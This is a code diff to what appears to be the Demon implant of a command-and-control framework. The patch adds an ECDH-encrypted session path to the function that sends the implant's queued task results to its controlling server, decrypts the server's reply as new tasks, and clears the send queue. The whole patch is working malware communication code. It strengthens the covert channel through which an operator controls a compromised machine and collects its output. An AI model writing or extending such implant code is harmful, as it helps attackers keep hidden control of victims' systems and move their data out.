@@ -10,6 +10,10 @@
 #define AES256 1
 #include <crypt/AesCrypt.h>
 
+#ifdef ARCHON_ECDH_MODE
+#include <crypt/EcdhInit.h>
+#endif
+
 VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
 {
     Buffer[ 7 ] = Value & 0xFF;
@@ -407,6 +411,113 @@ BOOL PackageTransmitAll(
     // so if we don't having nothing to send, simply exit
     if ( ! Instance->Packages )
         return TRUE;
+#endif
+
+#ifdef ARCHON_ECDH_MODE
+    /* ECDH session path: build a DemonMessage (all fields little-endian) from the
+     * queued packages, seal it as an ECDH session packet, and decrypt the response.
+     * This path completely replaces the AES-CTR GET_JOB path when ECDH is active. */
+    if ( Instance->ECDH.Active ) {
+        PPACKAGE Cur;
+        SIZE_T   msg_len    = 0;
+        PUINT8   msg_buf    = NULL;
+        PUINT8   pkt_buf    = NULL;
+        ei_size_t pkt_written = 0;
+        PVOID    raw_resp   = NULL;
+        SIZE_T   raw_rsize  = 0;
+        BOOL     ecdh_ok    = FALSE;
+
+        /* Mark all queued packages as included and compute DemonMessage payload size.
+         * DemonMessage wire format per package: cmd_id(4 LE) | req_id(4 LE) | len(4 LE) | data */
+        for ( Cur = Instance->Packages; Cur; Cur = Cur->Next ) {
+            Cur->Included = TRUE;
+            msg_len += 4 + 4 + 4 + (SIZE_T)Cur->Length;
+        }
+
+        /* Allocate +1 so LocalAlloc(LPTR,0) isn't called for an empty queue */
+        msg_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, msg_len + 1 );
+        if ( msg_buf ) {
+            PUINT8 cursor = msg_buf;
+
+            for ( Cur = Instance->Packages; Cur; Cur = Cur->Next ) {
+                UINT32 cmd = Cur->CommandID;
+                UINT32 req = Cur->RequestID;
+                UINT32 len = (UINT32)Cur->Length;
+                cursor[0] = (UINT8)(cmd      ); cursor[1] = (UINT8)(cmd >>  8);
+                cursor[2] = (UINT8)(cmd >> 16); cursor[3] = (UINT8)(cmd >> 24);
+                cursor += 4;
+                cursor[0] = (UINT8)(req      ); cursor[1] = (UINT8)(req >>  8);
+                cursor[2] = (UINT8)(req >> 16); cursor[3] = (UINT8)(req >> 24);
+                cursor += 4;
+                cursor[0] = (UINT8)(len      ); cursor[1] = (UINT8)(len >>  8);
+                cursor[2] = (UINT8)(len >> 16); cursor[3] = (UINT8)(len >> 24);
+                cursor += 4;
+                MemCopy( cursor, Cur->Buffer, Cur->Length );
+                cursor += Cur->Length;
+            }
+
+            /* Seal as ECDH session packet: conn_id(16) | nonce(12) | ciphertext | tag(16) */
+            pkt_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, 16 + 12 + msg_len + 16 );
+            if ( pkt_buf && ecdh_build_session_packet(
+                    Instance->ECDH.ConnectionId,
+                    Instance->ECDH.SessionKey,
+                    (const ei_u8 *)msg_buf, (ei_size_t)msg_len,
+                    (ei_u8 *)pkt_buf, &pkt_written,
+                    ArchonEcdhRng ) ) {
+
+                if ( TransportSend( pkt_buf, (SIZE_T)pkt_written, &raw_resp, &raw_rsize ) ) {
+                    if ( raw_resp && raw_rsize >= (SIZE_T)ECDH_SESS_RESP_MIN ) {
+                        /* Response: nonce(12) | ciphertext | tag(16); allocate upper-bound */
+                        PUINT8 plain_buf = (PUINT8)Instance->Win32.LocalAlloc( LPTR, raw_rsize );
+                        if ( plain_buf ) {
+                            ei_size_t plain_len = 0;
+                            if ( ecdh_open_session_response(
+                                    Instance->ECDH.SessionKey,
+                                    (const ei_u8 *)raw_resp, (ei_size_t)raw_rsize,
+                                    (ei_u8 *)plain_buf, &plain_len ) ) {
+                                if ( Response ) *Response = plain_buf;
+                                if ( Size )     *Size     = (SIZE_T)plain_len;
+                                ecdh_ok = TRUE;
+                            } else {
+                                Instance->Win32.LocalFree( plain_buf );
+                            }
+                        }
+                    } else {
+                        ecdh_ok = TRUE; /* empty response = no pending tasks */
+                    }
+                }
+            }
+            if ( pkt_buf ) Instance->Win32.LocalFree( pkt_buf );
+            Instance->Win32.LocalFree( msg_buf );
+        }
+
+        /* Remove successfully sent packages from the queue (same logic as normal path) */
+        Entry = Instance->Packages;
+        Prev  = NULL;
+        if ( ecdh_ok ) {
+            while ( Entry ) {
+                if ( Entry->Included ) {
+                    if ( Entry == Instance->Packages ) {
+                        Instance->Packages = Entry->Next;
+                        if ( Entry->Destroy ) { PackageDestroy( Entry ); Entry = NULL; }
+                        Entry = Instance->Packages;
+                        Prev  = NULL;
+                    } else if ( Prev ) {
+                        Prev->Next = Entry->Next;
+                        if ( Entry->Destroy ) { PackageDestroy( Entry ); Entry = NULL; }
+                        Entry = Prev->Next;
+                    }
+                } else {
+                    Prev  = Entry;
+                    Entry = Entry->Next;
+                }
+            }
+        } else {
+            while ( Entry ) { Entry->Included = FALSE; Entry = Entry->Next; }
+        }
+
+        return ecdh_ok;
+    }
 #endif
 
     Package = PackageCreateWithMetaData( DEMON_COMMAND_GET_JOB );
